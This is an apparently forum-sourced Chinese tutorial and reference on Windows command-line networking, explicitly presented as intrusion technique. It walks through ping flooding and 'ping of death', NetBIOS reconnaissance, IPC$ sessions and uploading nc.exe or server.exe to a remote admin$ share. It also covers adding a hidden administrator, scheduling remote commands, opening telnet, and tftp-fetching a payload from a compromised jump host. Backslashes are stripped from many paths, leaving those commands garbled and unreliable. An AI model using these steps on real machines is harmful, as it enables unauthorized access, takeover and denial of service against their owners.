# DOS

DOS命令大放送
 国际黑客组织
一，ping

它是用来检查网络是否通畅或者网络连接速度的命令。作为一个生活在网络上的管理员或者黑客来说，ping命令是第一个必须掌握的DOS命令，它所利用的原理是这样的：网络上的机器都有唯一确定的IP地址，我们给目标IP地址发送一个数据包，对方就要返回一个同样大小的数据包，根据返回的数据包我们可以确定目标主机的存在，可以初步判断目标主机的操作系统等。下面就来看看它的一些常用的操作。先看看帮助吧，在DOS窗口中键入：ping /? 回车，。所示的帮助画面。在此，我们只掌握一些基本的很有用的参数就可以了（下同）。
-t 表示将不间断向目标IP发送数据包，直到我们强迫其停止。试想，如果你使用100M的宽带接入，而目标IP是56K的小猫，那么要不了多久，目标IP就因为承受不了这么多的数据而掉线，呵呵，一次攻击就这么简单的实现了。
-l 定义发送数据包的大小，默认为32字节，我们利用它可以最大定义到65500字节。结合上面介绍的-t参数一起使用，会有更好的效果哦。
-n 定义向目标IP发送数据包的次数，默认为3次。如果网络速度比较慢，3次对我们来说也浪费了不少时间，因为现在我们的目的仅仅是判断目标IP是否存在，那么就定义为一次吧。
说明一下，如果-t 参数和 -n参数一起使用，ping命令就以放在后面的参数为标准，比如“ping IP -t -n 3”，虽然使用了-t参数，但并不是一直ping下去，而是只ping 3次。另外，ping命令不一定非得ping IP，也可以直接ping主机域名，这样就可以得到主机的IP。
下面我们举个例子来说明一下具体用法。
这里time=2表示从发出数据包到接受到返回数据包所用的时间是2秒，从这里可以判断网络连接速度的大小。从TTL的返回值可以初步判断被ping主机的操作系统，之所以说“初步判断”是因为这个值是可以修改的。这里TTL=32表示操作系统可能是win98。
（小知识：如果TTL=128，则表示目标主机可能是Win2000；如果TTL=250，则目标主机可能是Unix）
至于利用ping命令可以快速查找局域网故障，可以快速搜索最快的QQ服务器，可以对别人进行ping攻击……这些就靠大家自己发挥了。
二，nbtstat
该命令使用TCP/IP上的NetBIOS显示协议统计和当前TCP/IP连接，使用这个命令你可以得到远程主机的NETBIOS信息，比如用户名、所属的工作组、网卡的MAC地址等。在此我们就有必要了解几个基本的参数。
-a 使用这个参数，只要你知道了远程主机的机器名称，就可以得到它的NETBIOS信息（下同）。
-A 这个参数也可以得到远程主机的NETBIOS信息，但需要你知道它的IP。
-n 列出本地机器的NETBIOS信息。
当得到了对方的IP或者机器名的时候，就可以使用nbtstat命令来进一步得到对方的信息了，这又增加了我们入侵的保险系数。
三，netstat
这是一个用来查看网络状态的命令，操作简便功能强大。
-a 查看本地机器的所有开放端口，可以有效发现和预防木马，可以知道机器所开的服务等信息，如图4。
这里可以看出本地机器开放有FTP服务、Telnet服务、邮件服务、WEB服务等。用法：netstat -a IP。
-r 列出当前的路由信息，告诉我们本地机器的网关、子网掩码等信息。用法：netstat-r IP。
四，tracert
跟踪路由信息，使用此命令可以查出数据从本地机器传输到目标主机所经过的所有途径，这对我们了解网络布局和结构很有帮助。如图5。
这里说明数据从本地机器传输到192.168.0.1的机器上，中间没有经过任何中转，说明这两台机器是在同一段局域网内。用法：tracert IP。
五，net
这个命令是网络命令中最重要的一个，必须透彻掌握它的每一个子命令的用法，因为它的功能实在是太强大了，这简直就是微软为我们提供的最好的入侵工具。首先让我们来看一看它都有那些子命令，键入net /?回车如图6。
在这里，我们重点掌握几个入侵常用的子命令。
net view
使用此命令查看远程主机的所以共享资源。命令格式为net view IP。
net use
把远程主机的某个共享资源影射为本地盘符，图形界面方便使用，呵呵。命令格式为net use x:IPsharename。上面一个表示把192.168.0.5IP的共享名为magic的目录影射为本地的Z盘。下面表示和192.168.0.7建立IPC$连接（netuse IPIPC$ "password" /user:"name"），
建立了IPC$连接后，呵呵，就可以上传文件了：copy nc.exe192.168.0.7admin$，表示把本地目录下的nc.exe传到远程主机，结合后面要介绍到的其他DOS命令就可以实现入侵了。
net start
使用它来启动远程主机上的服务。当你和远程主机建立连接后，如果发现它的什么服务没有启动，而你又想利用此服务怎么办？就使用这个命令来启动吧。用法：net start servername，如图9，成功启动了telnet服务。
net stop
入侵后发现远程主机的某个服务碍手碍脚，怎么办？利用这个命令停掉就ok了，用法和net start同。
net user
查看和帐户有关的情况，包括新建帐户、删除帐户、查看特定帐户、激活帐户、帐户禁用等。这对我们入侵是很有利的，最重要的，它为我们克隆帐户提供了前提。键入不带参数的net user，可以查看所有用户，包括已经禁用的。下面分别讲解。
1，net user abcd 1234 /add，新建一个用户名为abcd，密码为1234的帐户，默认为user组成员。
2，net user abcd /del，将用户名为abcd的用户删除。
3，net user abcd /active:no，将用户名为abcd的用户禁用。
4，net user abcd /active:yes，激活用户名为abcd的用户。
5，net user abcd，查看用户名为abcd的用户的情况
net localgroup
查看所有和用户组有关的信息和进行相关操作。键入不带参数的net localgroup即列出当前所有的用户组。在入侵过程中，我们一般利用它来把某个帐户提升为administrator组帐户，这样我们利用这个帐户就可以控制整个远程主机了。用法：netlocalgroup groupname username /add。
现在我们把刚才新建的用户abcd加到administrator组里去了，这时候abcd用户已经是超级管理员了，呵呵，你可以再使用net user abcd来查看他的状态，和图10进行比较就可以看出来。但这样太明显了，网管一看用户情况就能漏出破绽，所以这种方法只能对付菜鸟网管，但我们还得知道。现在的手段都是利用其他工具和手段克隆一个让网管看不出来的超级管理员，这是后话。有兴趣的朋友可以参照《黑客防线》第30期上的《由浅入深解析隆帐户》一文。
net time
这个命令可以查看远程主机当前的时间。如果你的目标只是进入到远程主机里面，那么也许就用不到这个命令了。但简单的入侵成功了，难道只是看看吗？我们需要进一步渗透。这就连远程主机当前的时间都需要知道，因为利用时间和其他手段（后面会讲到）可以实现某个命令和程序的定时启动，为我们进一步入侵打好基础。用法：net time IP。
六，at
这个命令的作用是安排在特定日期或时间执行某个特定的命令和程序（知道net time的重要了吧？）。当我们知道了远程主机的当前时间，就可以利用此命令让其在以后的某个时间（比如2分钟后）执行某个程序和命令。用法：at time command computer。
表示在6点55分时，让名称为a-01的计算机开启telnet服务（这里net start telnet即为开启telnet服务的命令）。
七，ftp
大家对这个命令应该比较熟悉了吧？网络上开放的ftp的主机很多，其中很大一部分是匿名的，也就是说任何人都可以登陆上去。现在如果你扫到了一台开放ftp服务的主机（一般都是开了21端口的机器），如果你还不会使用ftp的命令怎么办？下面就给出基本的ftp命令使用方法。
首先在命令行键入ftp回车，出现ftp的提示符，这时候可以键入“help”来查看帮助（任何DOS命令都可以使用此方法查看其帮助)。
大家可能看到了，这么多命令该怎么用？其实也用不到那么多，掌握几个基本的就够了。
首先是登陆过程，这就要用到open了，直接在ftp的提示符下输入“open 主机IP ftp端口”回车即可，一般端口默认都是21，可以不写。接着就是输入合法的用户名和密码进行登陆了，这里以匿名ftp为例介绍。
用户名和密码都是ftp，密码是不显示的。当提示**** loggedin时，就说明登陆成功。这里因为是匿名登陆，所以用户显示为Anonymous。
接下来就要介绍具体命令的使用方法了。
dir 跟DOS命令一样，用于查看服务器的文件，直接敲上dir回车，就可以看到此ftp服务器上的文件。
cd 进入某个文件夹。
get 下载文件到本地机器。
put 上传文件到远程服务器。这就要看远程ftp服务器是否给了你可写的权限了，如果可以，呵呵，该怎么利用就不多说了，大家就自由发挥去吧。
delete 删除远程ftp服务器上的文件。这也必须保证你有可写的权限。
bye 退出当前连接。
quit 同上。
八，telnet
功能强大的远程登陆命令，几乎所有的入侵者都喜欢用它，屡试不爽。为什么？它操作简单，如同使用自己的机器一样，只要你熟悉DOS命令，在成功以administrator身份连接了远程机器后，就可以用它来干你想干的一切了。下面介绍一下使用方法，首先键入telnet回车，再键入help查看其帮助信息。
然后在提示符下键入open IP回车，这时就出现了登陆窗口，让你输入合法的用户名和密码，这里输入任何密码都是不显示的。
当输入用户名和密码都正确后就成功建立了telnet连接，这时候你就在远程主机上具有了和此用户一样的权限，利用DOS命令就可以实现你想干的事情了。这里我使用的超级管理员权限登陆的。
到这里为止，网络DOS命令的介绍就告一段落了，这里介绍的目的只是给菜鸟网管一个印象，让其知道熟悉和掌握网络DOS命令的重要性。其实和网络有关的DOS命令还远不止这些，这里只是抛砖引玉，希望能对广大菜鸟网管有所帮助。学好DOS对当好网管有很大的帮助，特别的熟练掌握了一些网络的DOS命令。
另外大家应该清楚，任何人要想进入系统，必须得有一个合法的用户名和密码（输入法漏洞差不多绝迹了吧），哪怕你拿到帐户的只有一个很小的权限，你也可以利用它来达到最后的目的。所以坚决消灭空口令，给自己的帐户加上一个强壮的密码，是最好的防御弱口令入侵的方法
全集
net use ipipc$ " " /user:" " 建立IPC空链接
net use ipipc$ "密码" /user:"用户名" 建立IPC非空链接
net use h: ipc$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H:
net use h: ipc$ 登陆后映射对方C：到本地为H:
net use ipipc$ /del 删除IPC链接
net use h: /del 删除映射对方到本地的为H:的映射
net user 用户名　密码　/add 建立用户
net user guest /active:yes 激活guest用户
net user 查看有哪些用户
net user 帐户名 查看帐户的属性
net localgroup administrators 用户名/add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数
net start 查看开启了哪些服务
net start 服务名　 开启服务；(如:net start telnet， net start schedule)
net stop 服务名 停止某服务
net time 目标ip 查看对方时间
net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息
net view 查看本地局域网内开启了哪些共享
net view ip 查看对方局域网内开启了哪些共享
net config 显示系统网络设置
net logoff 断开连接的共享
net pause 服务名 暂停某服务
net send ip "文本信息" 向对方发信息
net ver 局域网内正在使用的网络连接类型和信息
net share 查看本地开启的共享
net share ipc$ 开启ipc$共享
net share ipc$ /del 删除ipc$共享
net share c$ /del 删除C：共享
net user guest 12345 用guest用户登陆后用将密码改为12345
net password 密码 更改系统登陆密码
netstat -a 查看开启了哪些端口,常用netstat -an
netstat -n 查看端口的网络连接情况，常用netstat -an
netstat -v 查看正在进行的工作
netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）
netstat -s 查看正在使用的所有协议使用情况
nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写
tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。
ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。
ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)
ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息
tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)
kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)
del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件
二：
del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）
move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖
fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令
at id号 开启已注册的某个计划任务
at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止
at id号 /delete 停止某个已注册的计划任务
at 查看所有的计划任务
at ip time 程序名(或一个命令)/r 在某时间运行对方某程序并重新启动计算机
finger username @host 查看最近有哪些用户登陆
telnet ip 端口 远和登陆服务器,默认端口为23
open ip 连接到IP（属telnet登陆后的命令）
telnet 在本机上直接键入telnet 将进入本机的telnet
copy 路径文件名1　路径文件名2/y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件
copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下
cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指黑吧文件，/a指ASCLL格式文件
copy ipadmin$svv.exe c: 或:copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：
xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件
tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以黑吧模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送
tftp -i 对方IP　putc:server.exe 登陆后，上传本地c:server.exe至主机
ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用黑吧方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)
route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface
arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp-a将显示出全部信息
start 程序名或命令 /max 或/min新开一个新窗口并最大化（最小化）运行某程序或命令
mem 查看cpu使用情况
attrib 文件名(目录名) 查看某文件（目录）的属性
attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的存档，只读，系统，隐藏 属性；用＋则是添加为某属性
dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间
date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间
set 指定环境变量名称=要指派给变量的字符 设置环境变量
set 显示当前所有的环境变量
set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量
pause 暂停批处理程序，并显示出：请按任意键继续....
if 在批处理程序中执行条件处理（更多说明见if命令及变量）
goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）
call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call/?）
for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）
echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置
echo 信息 在屏幕上显示出信息
echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中
findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello
find 文件名 查找某文件
title 标题名字 更改CMD窗口标题名字
color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白
prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )
三：
ver 在DOS窗口下显示版本信息
winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）
format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS
md　目录名 创建目录
replace 源文件　要替换文件的目录 替换文件
ren 原文件名　新文件名 重命名文件名
tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称
type 文件名 显示文本文件的内容
more 文件名 逐屏显示输出文件
doskey 要锁定的命令＝字符
doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskeydir=entsky (不能用doskey dir=dir)；解锁：doskey dir=
taskmgr 调出任务管理器
chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误
tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口
exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe
path 路径可执行文件的文件名 为可执行文件设置一个路径。
cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?
regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；
regedit /e 注册表文件名 导出注册表
cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:est.txt /D pub 设定d: est.txt拒绝pub用户访问。
cacls 文件名 查看文件的访问用户权限列表
REM 文本内容 在批处理文件中添加注解
netsh 查看或更改本地网络配置情况
四：
IIS服务命令：
iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）
iisreset /start或stop 启动（停止）所有Internet服务
iisreset /restart 停止然后重新启动所有Internet服务
iisreset /status 显示所有Internet服务状态
iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动
iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机
iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务
iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。
FTP 命令： (后面有详细说明内容)
ftp的命令行格式为:
ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。
－d 使用调试方式。
－n 限制ftp的自动登录,即不使用.netrc文件。
－g 取消全局文件名。
help [命令] 或 ？[命令] 查看命令说明
bye 或 quit 终止主机FTP进程,并退出FTP管理方式.
pwd 列出当前远端主机目录
put 或 send 本地文件名[上传到主机上的文件名] 将本地一个文件传送至远端主机中
get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中
mget [remote-files] 从远端主机接收一批文件至本地主机
mput local-files 将本地主机中一批文件传送至远端主机
dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件
ascii 设定以ASCII方式传送文件(缺省值)
bin 或 image 设定以黑吧方式传送文件
bell 每完成一次文件传送,报警提示
cdup 返回上一级目录
close 中断与远程服务器的ftp会话(与open对应)
open host[port] 建立指定ftp服务器连接,可指定连接端口
delete 删除远端主机中的文件
mdelete [remote-files] 删除一批文件
mkdir directory-name 在远端主机中建立目录
rename [from] [to] 改变远端主机中的文件名
rmdir directory-name 删除远端主机中的目录
status 显示当前FTP的状态
system 显示远端主机系统类型
user user-name [password] [account] 重新以别的用户名登录远端主机
open host [port] 重新建立一个新的连接
prompt 交互提示模式
macdef 定义宏命令
lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录
chmod 改变远端主机的文件权限
case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母
cd remote－dir 进入远程主机目录
cdup 进入远程主机目录的父目录
! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip
